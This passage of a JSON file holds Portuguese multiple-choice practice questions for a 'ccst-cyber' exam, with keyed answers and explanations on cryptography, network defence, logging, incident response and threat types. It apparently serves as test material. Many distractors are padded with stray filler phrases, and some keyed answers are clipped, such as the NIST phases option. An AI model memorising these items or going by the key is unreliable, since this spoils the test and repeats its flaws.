    "domain": "1.3"
  },
  {
    "question": "Que propriedade oferece uma função de hash criptográfica?",
    "options": [
      "Pode ser revertida para recuperar a entrada original em redes empresariais típicas",
      "Mapeia os dados para um valor de tamanho fixo difícil de reverter",
      "Cifra sempre os dados com uma chave secreta partilhada",
      "Comprime ficheiros para poupar espaço de armazenamento"
    ],
    "correct": 1,
    "explanation": "Um hash é uma função de sentido único que produz um resumo de tamanho fixo; não é reversível nem é cifra.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "cripto",
    "domain": "1.4"
  },
  {
    "question": "Que associação entre estado dos dados e proteção está correta?",
    "options": [
      "Dados em trânsito protegidos por TLS",
      "Dados em repouso protegidos ao desativar os registos",
      "Dados em uso protegidos ao apagar as cópias de segurança",
      "Dados em trânsito protegidos por espelhamento RAID"
    ],
    "correct": 0,
    "explanation": "Os dados em trânsito são protegidos por cifra de transporte como o TLS; os dados em repouso por cifra de armazenamento; RAID e registos não são controlos de confidencialidade.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "cripto",
    "domain": "1.4"
  },
  {
    "question": "O que é que um certificado digital liga principalmente?",
    "options": [
      "Uma chave pública à identidade do seu dono",
      "Duas chaves simétricas para cifrar mais depressa",
      "Uma password a um código de uso único",
      "Um endereço MAC a um endereço IP"
    ],
    "correct": 0,
    "explanation": "Um certificado X.509 liga uma chave pública a uma identidade, atestada por uma Autoridade de Certificação, o que é a base da confiança na PKI.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "cripto",
    "domain": "1.4"
  },
  {
    "question": "Que protocolo TCP/IP não tem autenticação, tornando possível o ARP spoofing numa LAN?",
    "options": [
      "ARP",
      "HTTPS",
      "SSH",
      "IPsec"
    ],
    "correct": 0,
    "explanation": "O ARP não tem autenticação, por isso um atacante pode enviar respostas forjadas (ARP spoofing) para redirecionar o tráfego da LAN; HTTPS, SSH e IPsec autenticam.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "rede-cloud",
    "domain": "2.1"
  },
  {
    "question": "Como é que a segmentação de rede melhora a segurança?",
    "options": [
      "Cifra automaticamente todos os pacotes",
      "Limita até onde um atacante se pode mover entre zonas",
      "Elimina a necessidade de passwords dentro de cada zona",
      "Garante 100% de disponibilidade para todos os servidores"
    ],
    "correct": 1,
    "explanation": "A segmentação (VLANs, sub-redes, firewalls entre zonas) contém intrusões e limita o movimento lateral, mas não cifra o tráfego nem dispensa a autenticação.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "rede-cloud",
    "domain": "2.2"
  },
  {
    "question": "Qual é o papel de uma DMZ numa rede?",
    "options": [
      "Uma zona que aloja serviços expostos à Internet isolados da LAN interna",
      "Um túnel cifrado entre dois escritórios na maioria dos ambientes de produção",
      "Uma fonte de alimentação de reserva para os equipamentos de rede",
      "Uma lista de endereços IP bloqueados em redes empresariais típicas"
    ],
    "correct": 0,
    "explanation": "Uma DMZ é um segmento que expõe serviços públicos (web, correio) mantendo-os isolados da rede interna de confiança.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "rede-cloud",
    "domain": "2.3"
  },
  {
    "question": "Para que serve um honeypot?",
    "options": [
      "Para acelerar o tráfego legítimo",
      "Para atrair e observar atacantes num sistema-engodo",
      "Para guardar cópias de segurança cifradas fora do local",
      "Para equilibrar a carga entre servidores web"
    ],
    "correct": 1,
    "explanation": "Um honeypot é um sistema-engodo concebido para atrair atacantes, de modo a detetar e estudar o seu comportamento sem arriscar a produção.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "rede-cloud",
    "domain": "2.3"
  },
  {
    "question": "Que definição protege melhor um Wi-Fi de pequeno escritório?",
    "options": [
      "Esconder apenas o SSID",
      "WPA3 (ou WPA2) com uma frase-passe forte",
      "Manter a password de administração por omissão",
      "Filtragem de MAC como único controlo"
    ],
    "correct": 1,
    "explanation": "A cifra forte WPA3/WPA2 com uma boa frase-passe é o controlo principal; esconder o SSID ou filtrar MAC sozinhos são fracos e facilmente contornáveis.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "rede-cloud",
    "domain": "2.4"
  },
  {
    "question": "Um trabalhador remoto precisa de acesso cifrado a servidores internos pela Internet. Que tecnologia se adequa?",
    "options": [
      "Uma VPN",
      "Um servidor DHCP",
      "Um pool de NAT",
      "Um servidor NTP"
    ],
    "correct": 0,
    "explanation": "Uma VPN cria um túnel cifrado para que um utilizador remoto alcance recursos internos de forma segura através da Internet pública.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "firewall-vpn",
    "domain": "2.5"
  },
  {
    "question": "O que é que o NAC (Controlo de Acesso à Rede) verifica sobretudo antes de permitir um dispositivo na rede?",
    "options": [
      "A identidade e a postura de segurança do dispositivo",
      "O modelo exato do monitor do utilizador",
      "O número de separadores abertos no browser",
      "O brilho do ecrã quando não existem outros controlos"
    ],
    "correct": 0,
    "explanation": "O NAC verifica quem/o que se está a ligar e se o dispositivo cumpre os requisitos de postura (atualizações, antivírus) antes de conceder acesso.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "firewall-vpn",
    "domain": "2.5"
  },
  {
    "question": "No Windows, o que faz uma firewall de host como a Firewall do Windows Defender?",
    "options": [
      "Controla as ligações de rede de e para esse único computador",
      "Cifra o disco rígido do computador no dia a dia das operações",
      "Analisa os anexos de correio no servidor de email",
      "Gere as políticas de grupo do Active Directory"
    ],
    "correct": 0,
    "explanation": "Uma firewall de host filtra o tráfego de entrada/saída da máquina individual onde corre, complementando as firewalls de rede.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "endpoint",
    "domain": "3.1"
  },
  {
    "question": "O que é a escalada de privilégios num endpoint?",
    "options": [
      "Dar a todas as apps os mesmos direitos baixos durante janelas de manutenção de rotina",
      "Obter direitos superiores aos concedidos, por exemplo de utilizador a administrador",
      "Mudar o nome da conta de administrador quando não existem outros controlos",
      "Terminar a sessão de utilizadores inativos automaticamente"
    ],
    "correct": 1,
    "explanation": "A escalada de privilégios é quando um atacante ou processo obtém permissões superiores às devidas, por exemplo passar de utilizador normal a SYSTEM/administrador.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "endpoint",
    "domain": "3.1"
  },
  {
    "question": "Que ferramenta de linha de comandos mostra as ligações de rede ativas e as portas à escuta num host?",
    "options": [
      "netstat",
      "ipconfig",
      "chmod",
      "traceroute"
    ],
    "correct": 0,
    "explanation": "O netstat lista ligações ativas e portas à escuta, útil para detetar serviços suspeitos; o ipconfig mostra definições de IP e o traceroute traça caminhos.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "endpoint",
    "domain": "3.2"
  },
  {
    "question": "Que ferramenta captura e inspeciona pacotes em bruto numa interface para análise?",
    "options": [
      "tcpdump",
      "nslookup",
      "whoami",
      "ping"
    ],
    "correct": 0,
    "explanation": "O tcpdump captura pacotes em bruto para análise; o nslookup consulta DNS, o whoami mostra o utilizador atual e o ping testa a acessibilidade.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "endpoint",
    "domain": "3.2"
  },
  {
    "question": "Que referencial de conformidade rege especificamente a proteção de dados de cartões de pagamento?",
    "options": [
      "PCI DSS",
      "HIPAA",
      "RGPD na maioria dos ambientes de produção",
      "FERPA"
    ],
    "correct": 0,
    "explanation": "O PCI DSS cobre os dados de titulares de cartões; o HIPAA cobre dados de saúde nos EUA, o RGPD dados pessoais na UE e o FERPA registos educativos nos EUA.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "risco",
    "domain": "3.3"
  },
  {
    "question": "Qual é a principal preocupação de segurança numa política de BYOD (traz o teu próprio dispositivo)?",
    "options": [
      "Os dispositivos usam pouca eletricidade quando não existem outros controlos na maioria dos ambientes de produção",
      "Os dispositivos pessoais podem não ser geridos e misturam dados pessoais e corporativos",
      "Os colaboradores nunca instalarão aplicações durante janelas de manutenção de rotina",
      "O Wi-Fi do escritório fica mais rápido durante janelas de manutenção de rotina"
    ],
    "correct": 1,
    "explanation": "O BYOD significa que dispositivos pessoais, muitas vezes não geridos, acedem a dados corporativos, pelo que são precisos controlos como MDM, cifra e contentorização.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "risco",
    "domain": "3.3"
  },
  {
    "question": "Porque é importante aplicar atualizações atempadamente para a segurança?",
    "options": [
      "Torna o ecrã mais brilhante no dia a dia das operações",
      "Fecha vulnerabilidades conhecidas antes de serem exploradas",
      "Aumenta o tamanho do disco segundo a prática comum durante janelas de manutenção de rotina",
      "Desativa todos os registos em redes empresariais típicas"
    ],
    "correct": 1,
    "explanation": "As atualizações corrigem falhas conhecidas; muitas intrusões exploram vulnerabilidades para as quais já existe correção que não foi aplicada.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "endpoint",
    "domain": "3.4"
  },
  {
    "question": "No Windows, que ferramenta se abre primeiro para rever os registos de sistema e de segurança?",
    "options": [
      "Visualizador de Eventos",
      "Gestor de Tarefas",
      "Limpeza do Disco",
      "Bloco de Notas na maioria dos ambientes de produção"
    ],
    "correct": 0,
    "explanation": "O Visualizador de Eventos mostra os registos de sistema, aplicação e segurança do Windows, o ponto de partida para detetar anomalias num host.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "logs-ir",
    "domain": "3.5"
  },
  {
    "question": "No Linux, onde são tradicionalmente recolhidas muitas mensagens de autenticação e de sistema?",
    "options": [
      "Na facilidade syslog (por exemplo /var/log)",
      "No firmware da BIOS quando não existem outros controlos",
      "Na partição de swap",
      "Na memória da GPU segundo a prática comum"
    ],
    "correct": 0,
    "explanation": "O Linux recolhe mensagens de autenticação e de sistema via syslog, tipicamente em /var/log (auth.log, messages, journal), usadas na deteção de anomalias.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "logs-ir",
    "domain": "3.5"
  },
  {
    "question": "Qual é a diferença entre reconhecimento ativo e passivo?",
    "options": [
      "O ativo interage com o alvo; o passivo só observa dados disponíveis",
      "O ativo é sempre legal; o passivo é sempre ilegal",
      "O ativo usa IPv6; o passivo usa IPv4 na maioria dos ambientes de produção",
      "Não há diferença entre eles em redes empresariais típicas"
    ],
    "correct": 0,
    "explanation": "O reconhecimento ativo envia sondas ao alvo (varrimentos de portas), sendo detetável; o passivo recolhe informação pública sem tocar no alvo.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "risco",
    "domain": "4.1"
  },
  {
    "question": "O que representa um identificador CVE?",
    "options": [
      "Uma referência única para uma vulnerabilidade publicamente conhecida",
      "Uma norma de cifra de VPN da Cisco no dia a dia das operações",
      "Um formato de exportação de cofre de credenciais",
      "Uma extensão de validade de certificado quando não existem outros controlos"
    ],
    "correct": 0,
    "explanation": "Um ID CVE (Common Vulnerabilities and Exposures) referencia de forma única uma vulnerabilidade divulgada publicamente, para que ferramentas e avisos a identifiquem igual.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "risco",
    "domain": "4.2"
  },
  {
    "question": "Como diferem vulnerabilidade e risco?",
    "options": [
      "São exatamente a mesma coisa segundo a prática comum",
      "Uma vulnerabilidade é uma fraqueza",
      "O risco só se aplica a hardware",
      "Uma vulnerabilidade causa sempre uma falha de segurança"
    ],
    "correct": 1,
    "explanation": "Uma vulnerabilidade é uma fraqueza; o risco combina a probabilidade de uma ameaça a explorar com o impacto resultante, por isso nem toda a vulnerabilidade é de risco elevado.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "risco",
    "domain": "4.3"
  },
  {
    "question": "Na recuperação de desastres, o que define o RPO (Objetivo de Ponto de Recuperação)?",
    "options": [
      "Quanta perda de dados, medida em tempo, é aceitável",
      "Quão depressa se acendem as luzes do escritório",
      "Quantos utilizadores podem iniciar sessão ao mesmo tempo",
      "O comprimento máximo da password"
    ],
    "correct": 0,
    "explanation": "O RPO é a quantidade máxima aceitável de perda de dados expressa como janela de tempo, o que determina a frequência das cópias de segurança.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "risco",
    "domain": "4.4"
  },
  {
    "question": "Um controlo de recuperação que deteta um incidente em curso (por exemplo um alerta de IDS) é de que tipo?",
    "options": [
      "Preventivo",
      "Detetivo",
      "Corretivo",
      "Cosmético"
    ],
    "correct": 1,
    "explanation": "Os controlos são preventivos (impedem), detetivos (percebem) ou corretivos (reparam); um alerta de IDS que perceciona um evento é detetivo.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "risco",
    "domain": "4.4"
  },
  {
    "question": "O que faz sobretudo um SIEM num centro de operações de segurança?",
    "options": [
      "Recolhe e correlaciona registos de muitas fontes para gerar alertas",
      "Tranca fisicamente a porta da sala de servidores",
      "Cifra todos os portáteis dos utilizadores em parques de vários fabricantes",
      "Encaminha pacotes entre VLANs quando não existem outros controlos"
    ],
    "correct": 0,
    "explanation": "Um SIEM agrega e correlaciona registos/eventos de todo o parque para que os analistas detetem e investiguem incidentes.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "logs-ir",
    "domain": "5.1"
  },
  {
    "question": "Como é que o SOAR acrescenta valor em cima de um SIEM?",
    "options": [
      "Automatiza e orquestra ações de resposta para os alertas",
      "Elimina a necessidade de recolher registos",
      "É apenas um motor antivírus mais rápido quando não existem outros controlos",
      "Cifra só a base de dados do SIEM em repouso"
    ],
    "correct": 0,
    "explanation": "O SOAR acrescenta playbooks automáticos e orquestração para que passos repetitivos de resposta corram sozinhos, reduzindo a carga dos analistas.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "logs-ir",
    "domain": "5.1"
  },
  {
    "question": "O que descreve o modelo Cyber Kill Chain?",
    "options": [
      "As fases ordenadas por que passa um atacante",
      "Uma lista de cifras aprovadas durante janelas de manutenção de rotina",
      "A ordem dos fios de um cabo Ethernet",
      "Um calendário de rotação de backups"
    ],
    "correct": 0,
    "explanation": "A Cyber Kill Chain divide uma intrusão em fases ordenadas (reconhecimento, armamento, entrega, exploração, instalação, C2, ações), ajudando os defensores a interrompê-la.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "logs-ir",
    "domain": "5.2"
  },
  {
    "question": "De que é que a matriz MITRE ATT&CK é sobretudo um catálogo?",
    "options": [
      "Táticas e técnicas de adversários observadas no mundo real",
      "Fabricantes de firewalls aprovados segundo a prática comum",
      "Gamas de atribuição de endereços IP",
      "Normas de cores de cabos quando não existem outros controlos"
    ],
    "correct": 0,
    "explanation": "O ATT&CK cataloga táticas (objetivos) e técnicas (como) de adversários reais, usado para mapear deteções e avaliar cobertura.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "logs-ir",
    "domain": "5.2"
  },
  {
    "question": "Na resposta a incidentes, o que é a 'cadeia de custódia'?",
    "options": [
      "A ordem em que os switches encaminham tramas",
      "Um registo documentado de quem manuseou as provas e quando",
      "A sequência das regras de firewall quando não existem outros controlos",
      "A lista de utilizadores de um grupo"
    ],
    "correct": 1,
    "explanation": "A cadeia de custódia é o rasto documentado que mostra como as provas foram recolhidas, manuseadas e guardadas, para se manterem admissíveis e credíveis.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "logs-ir",
    "domain": "5.2"
  },
  {
    "question": "No RGPD, qual é uma obrigação-chave após uma violação qualificável de dados pessoais?",
    "options": [
      "Notificar a autoridade de controlo dentro do prazo exigido",
      "Apagar imediatamente todas as cópias de segurança da empresa",
      "Publicar publicamente todas as passwords afetadas",
      "Desligar toda a rede durante uma semana"
    ],
    "correct": 0,
    "explanation": "O RGPD exige notificar a autoridade de controlo (em regra em 72 horas) e, quando há risco elevado, informar os titulares afetados.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "risco",
    "domain": "5.3"
  },
  {
    "question": "Que sequência corresponde ao ciclo de resposta a incidentes do NIST SP 800-61?",
    "options": [
      "Preparação; Deteção e Análise; Contenção",
      "Backup; Restauro; Reinício; Relatório",
      "Varrer; Corrigir; Varrer; Corrigir",
      "Entrar; Sair; Auditar; Apagar quando não existem outros controlos"
    ],
    "correct": 0,
    "explanation": "O NIST SP 800-61 define quatro fases: Preparação; Deteção e Análise; Contenção, Erradicação e Recuperação; e Atividade Pós-Incidente (lições aprendidas).",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "logs-ir",
    "domain": "5.4"
  },
  {
    "question": "O que distingue o ransomware de outro malware?",
    "options": [
      "Acelera o computador silenciosamente na maioria dos ambientes de produção",
      "Cifra ou bloqueia os dados e exige pagamento para restaurar o acesso",
      "Mostra apenas anúncios inofensivos sem ferramentas adicionais",
      "Melhora a autonomia da bateria nos portáteis"
    ],
    "correct": 1,
    "explanation": "O ransomware cifra ou bloqueia os dados da vítima e exige um resgate pela chave de decifra ou pela reposição do acesso.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "ameacas",
    "domain": "1.2"
  },
  {
    "question": "O que é uma ameaça interna (insider)?",
    "options": [
      "Um risco vindo de alguém com acesso legítimo, como um colaborador",
      "Um scanner externo a sondar a firewall sem ferramentas adicionais",
      "Uma falha de energia no centro de dados quando não existem outros controlos",
      "Um erro de software no firmware do router"
    ],
    "correct": 0,
    "explanation": "Uma ameaça interna vem de pessoas com acesso autorizado (colaboradores, prestadores) que o usam indevidamente, por malícia ou negligência.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "ameacas",
    "domain": "1.2"
  },
  {
    "question": "O que é um ataque man-in-the-middle (MitM)?",
    "options": [
      "Um atacante retransmite em segredo e pode alterar o tráfego entre duas partes",
      "Uma cópia de segurança agendada que corre à meia-noite quando não existem outros controlos",
      "Uma regra de firewall que descarta todo o tráfego sem ferramentas adicionais",
      "Um tipo de conjunto de discos RAID na maioria dos ambientes de produção"
    ],
    "correct": 0,
    "explanation": "Num ataque MitM o adversário coloca-se entre duas partes em comunicação para intercetar e, possivelmente, modificar o seu tráfego.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "ameacas",
    "domain": "1.2"
  },
  {
    "question": "Qual é uma fraqueza comum de segurança em dispositivos IoT?",
    "options": [
      "Ter demasiada RAM no dia a dia das operações",
      "Virem com credenciais por omissão ou embutidas",
      "Correrem demasiadas atualizações de segurança",
      "Usarem firmware cifrado por omissão sem ferramentas adicionais"
    ],
    "correct": 1,
    "explanation": "Muitos dispositivos IoT vêm com passwords por omissão/embutidas e raramente são atualizados, tornando-se alvos fáceis e recrutas de botnets.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "ameacas",
    "domain": "1.2"
  },
  {
    "question": "O que é um 'vetor de ataque'?",
    "options": [
      "O caminho ou método que o atacante usa para alcançar e comprometer um alvo",
      "Um gráfico da temperatura do CPU na maioria dos ambientes de produção",
      "O comprimento físico de um cabo de rede em parques de vários fabricantes",
      "Uma folha de cálculo com salários sem ferramentas adicionais em parques de vários fabricantes"
    ],
    "correct": 0,
    "explanation": "Um vetor de ataque é a via/técnica (email de phishing, porta exposta, USB) por onde um atacante obtém acesso a um sistema.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "risco",
    "domain": "1.1"
  },
  {
    "question": "Porque é que o MD5 é considerado inadequado para hashing sensível à segurança hoje?",
    "options": [
      "É demasiado lento para CPUs modernos",
      "É vulnerável a ataques práticos de colisão",
      "Produz saída de comprimento variável",
      "Exige uma chave secreta partilhada no dia a dia das operações"
    ],
    "correct": 1,
    "explanation": "O MD5 tem ataques práticos de colisão, pelo que duas entradas diferentes podem partilhar o mesmo hash; recomendam-se algoritmos mais fortes como o SHA-256.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "cripto",
    "domain": "1.4"
  },
  {
    "question": "O que procura fazer um ataque de negação de serviço (DoS)?",
    "options": [
      "Roubar hashes de passwords silenciosamente",
      "Tornar um serviço indisponível para utilizadores legítimos",
      "Cifrar ficheiros para pedir resgate na maioria dos ambientes de produção",
      "Escalar privilégios até administrador"
    ],
    "correct": 1,
    "explanation": "Um ataque DoS sobrecarrega ou derruba um serviço para que utilizadores legítimos não o possam usar; o DDoS faz isso a partir de muitas fontes ao mesmo tempo.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "ameacas",
    "domain": "1.2"
  },
  {
    "question": "Qual é o objetivo de uma boa política de passwords?",
    "options": [
      "Obrigar os utilizadores a partilhar passwords",
      "Reduzir a hipótese de credenciais adivinháveis ou reutilizadas",
      "Guardar passwords em texto simples",
      "Desativar os bloqueios de conta durante janelas de manutenção de rotina"
    ],
    "correct": 1,
    "explanation": "Uma boa política de passwords (comprimento, complexidade, não reutilização, bloqueio) reduz o risco de credenciais fracas ou adivinháveis serem quebradas.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "identidade",
    "domain": "1.3"
  },
  {
    "question": "Como é que o NAT afeta ligações diretas de entrada da Internet para um host interno?",
    "options": [
      "Torna os hosts internos diretamente acessíveis por IP público",
      "Esconde os hosts internos atrás de um endereço público",
      "Cifra todo o tráfego interno segundo a prática comum",
      "Atribui endereços IPv6 a cada host"
    ],
    "correct": 1,
    "explanation": "O NAT mapeia endereços privados para um público; entradas não solicitadas não têm mapeamento, por isso os hosts internos não são diretamente acessíveis por omissão.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "rede-cloud",
    "domain": "2.2"
  },
  {
    "question": "Qual é o primeiro passo seguro quando um host mostra sinais de infeção por malware?",
    "options": [
      "Continuar a usá-lo normalmente na maioria dos ambientes de produção",
      "Isolá-lo da rede e correr uma análise de confiança",
      "Partilhar os seus ficheiros com colegas",
      "Desativar todos os seus registos"
    ],
    "correct": 1,
    "explanation": "Isolar o host trava a propagação e o C2; depois pode fazer-se uma análise de confiança e a investigação antes da limpeza ou reinstalação.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "endpoint",
    "domain": "3.6"
  },
  {
    "question": "O que consegue um varrimento de portas para um atacante ou auditor?",
    "options": [
      "Corrige serviços vulneráveis durante janelas de manutenção de rotina",
      "Descobre que portas TCP/UDP e serviços estão abertos num host",
      "Cifra o disco do alvo no dia a dia das operações",
      "Repõe as passwords dos utilizadores"
    ],
    "correct": 1,
    "explanation": "Um varrimento de portas enumera portas abertas e serviços à escuta, revelando a superfície de ataque; é reconhecimento, não uma correção.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "risco",
    "domain": "4.1"
  },
  {
    "question": "Ao monitorizar eventos de segurança, o que deve despoletar escalonamento?",
    "options": [
      "Cada início de sessão normal bem-sucedido durante janelas de manutenção de rotina",
      "Um sinal credível de incidente de segurança além do ruído de rotina",
      "Uma cópia de segurança noturna agendada a terminar",
      "Um utilizador a mudar o fundo do ambiente de trabalho"
    ],
    "correct": 1,
    "explanation": "Os analistas escalam quando há indícios de um incidente real (por exemplo malware confirmado, exfiltração de dados), não por eventos benignos de rotina.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "logs-ir",
    "domain": "5.1"
  },
  {
    "question": "O que descreve melhor a cifra assimétrica?",
    "options": [
      "Uma chave secreta partilhada cifra e decifra",
      "Uma chave pública cifra e a chave privada correspondente decifra",
      "Nunca usa chaves em parques de vários fabricantes",
      "Só funciona com dados em repouso quando não existem outros controlos"
    ],
    "correct": 1,
    "explanation": "A cifra assimétrica (de chave pública) usa um par de chaves: a pública cifra (ou verifica) e a privada decifra (ou assina).",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "cripto",
    "domain": "1.4"
  },
  {
    "question": "Porque é que o DHCP é uma preocupação de segurança numa LAN não fiável?",
    "options": [
      "Cifra o tráfego de forma demasiado forte",
      "Um servidor DHCP rogue pode entregar um gateway ou DNS malicioso",
      "Usa apenas a porta TCP 443 durante janelas de manutenção de rotina",
      "Desativa completamente o ARP em redes empresariais típicas"
    ],
    "correct": 1,
    "explanation": "Um servidor DHCP rogue pode atribuir aos clientes um gateway/DNS malicioso, permitindo interceção; o DHCP snooping mitiga isto.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "rede-cloud",
    "domain": "2.1"
  },
  {
    "question": "Que exemplo se enquadra melhor em 'algo que se é' como fator de autenticação?",
    "options": [
      "Um código PIN",
      "Uma impressão digital",
      "Um token de hardware",
      "Uma pergunta de segurança"
    ],
    "correct": 1,
    "explanation": "Os fatores de autenticação são algo que se sabe (PIN), se tem (token) ou se é (biometria); uma impressão digital é 'algo que se é'.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "identidade",
    "domain": "1.1"
  },
  {
    "question": "No Modelo Diamante de análise de intrusões, que quatro características centrais são ligadas?",
    "options": [
      "Adversário, Capacidade, Infraestrutura, Vítima",
      "Router, Switch, Firewall, Servidor",
      "Vermelho, Azul, Roxo, Verde na maioria dos ambientes de produção",
      "Preparação, Deteção, Recuperação, Revisão"
    ],
    "correct": 0,
    "explanation": "O Modelo Diamante liga adversário, capacidade, infraestrutura e vítima para raciocinar sobre um evento de intrusão.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "logs-ir",
    "domain": "5.2"
  },
  {
    "question": "Os níveis de risco são muitas vezes classificados em baixo, médio, alto e extremamente alto sobretudo para ajudar as organizações a quê?",
    "options": [
      "Escolher a cor das secretárias",
      "Priorizar que riscos tratar primeiro",
      "Escolher a localização do escritório",
      "Definir o canal do Wi-Fi"
    ],
    "correct": 1,
    "explanation": "Classificar a gravidade do risco permite às organizações priorizar o esforço e o orçamento de mitigação nos riscos mais sérios primeiro.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "risco",
    "domain": "4.3"
  },
  {
    "question": "O que contribui a gestão de ativos para a segurança dos endpoints?",
    "options": [
      "Torna os ecrãs maiores durante janelas de manutenção de rotina",
      "Mantém um inventário para encontrar dispositivos desconhecidos ou desatualizados",
      "Cifra o correio automaticamente em redes empresariais típicas",
      "Acelera o CPU durante janelas de manutenção de rotina quando não existem outros controlos"
    ],
    "correct": 1,
    "explanation": "Um inventário de hardware/software permite às equipas detetar dispositivos não geridos, rogue ou desatualizados que, de outro modo, seriam pontos cegos.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "endpoint",
    "domain": "3.3"
  },
  {
    "question": "Que afirmação sobre spear phishing está correta?",
    "options": [
      "Tem como alvo uma pessoa ou organização específica com conteúdo à medida",
      "É sempre enviado como carta impressa sem ferramentas adicionais",
      "Nunca usa email em redes empresariais típicas durante janelas de manutenção de rotina",
      "Só afeta routers em parques de vários fabricantes"
    ],
    "correct": 0,
    "explanation": "O spear phishing é direcionado: o atacante adapta o engodo a uma vítima específica usando detalhes pessoais ou organizacionais.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "ameacas",
    "domain": "1.2"
  },
  {
    "question": "Que protocolo protege o tráfego web cifrando o HTTP?",
    "options": [
      "HTTPS (HTTP sobre TLS)",
      "FTP durante janelas de manutenção de rotina",
      "Telnet na maioria dos ambientes de produção",
      "SNMPv1"
    ],
    "correct": 0,
    "explanation": "O HTTPS corre HTTP sobre TLS para cifrar o tráfego web; FTP, Telnet e SNMPv1 enviam dados em texto simples por omissão.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "cripto",
    "domain": "1.4"
  },
  {
    "question": "Ao rever registos, que padrão sugere mais um ataque de força bruta ao início de sessão?",
    "options": [
      "Um início de sessão bem-sucedido de manhã",
      "Muitos inícios de sessão falhados para uma conta em pouco tempo",
      "Uma única consulta de DNS quando não existem outros controlos",
      "Um evento de backup agendado na maioria dos ambientes de produção"
    ],
    "correct": 1,
    "explanation": "Uma rajada de autenticações falhadas contra uma conta (ou várias) numa janela curta é uma assinatura clássica de força bruta/spraying.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "logs-ir",
    "domain": "3.5"
  },
  {
    "question": "Qual é o principal papel de segurança de um servidor proxy no acesso web de saída?",
    "options": [
      "Atribui endereços IP aos clientes",
      "Intermedeia e pode filtrar/registar os pedidos web dos clientes",
      "Substitui totalmente a firewall durante janelas de manutenção de rotina",
      "Cifra o disco local sem ferramentas adicionais"
    ],
    "correct": 1,
    "explanation": "Um proxy direto intermedeia os pedidos web de saída dos clientes, permitindo filtragem, registo e inspeção de malware desse tráfego.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "rede-cloud",
    "domain": "2.3"
  },
  {
    "question": "O que significa 'endurecer' (hardening) um sistema?",
    "options": [
      "Adicionar-lhe mais RAM quando não existem outros controlos durante janelas de manutenção de rotina",
      "Reduzir a superfície de ataque removendo serviços desnecessários e apertando a configuração",
      "Pintar a caixa do servidor em redes empresariais típicas em parques de vários fabricantes",
      "Aumentar a resolução do monitor durante janelas de manutenção de rotina"
    ],
    "correct": 1,
    "explanation": "O hardening reduz a superfície de ataque: desativar serviços/portas não usados, remover contas por omissão, aplicar definições seguras e atualizações.",
    "difficulty": "Fácil",
    "exam": "ccst-cyber",
    "topic": "risco",
    "domain": "1.1"
  },
  {
    "question": "Qual é o principal benefício da contabilização (o terceiro A do AAA)?",
    "options": [
      "Bloqueia todo o tráfego de rede quando não existem outros controlos",
      "Regista as ações do utilizador para auditoria e forense",
      "Cifra a base de dados de passwords",
      "Atribui VLANs automaticamente segundo a prática comum"
    ],
    "correct": 1,
    "explanation": "A contabilização regista o que os utilizadores autenticados fizeram (comandos, sessões, dados), apoiando auditoria, faturação e investigação de incidentes.",
    "difficulty": "Médio",
    "exam": "ccst-cyber",
    "topic": "identidade",
    "domain": "1.3"
  },
  {
    "question": "O que procura fazer sobretudo um rootkit?",
